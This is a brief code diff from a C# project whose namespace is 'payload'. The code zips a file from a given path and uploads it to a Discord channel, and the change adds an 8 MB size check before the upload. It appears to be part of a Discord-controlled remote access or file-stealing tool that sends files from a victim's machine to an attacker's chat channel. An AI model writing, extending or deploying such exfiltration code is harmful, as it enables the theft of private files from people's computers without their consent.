@@ -173,7 +173,8 @@ namespace payload
                         filestream.Dispose();
                         archive.Dispose();
 
-                        await message.Channel.SendFileAsync(compressed, Path.GetFileName(filepath) + ".zip");
+                        if (compressed.Length > 8000000) await message.Channel.SendMessageAsync("File too big.");
+                        else await message.Channel.SendFileAsync(compressed, Path.GetFileName(filepath) + ".zip");
                         compressed.Dispose();
                         entrystream.Dispose();
                         break;
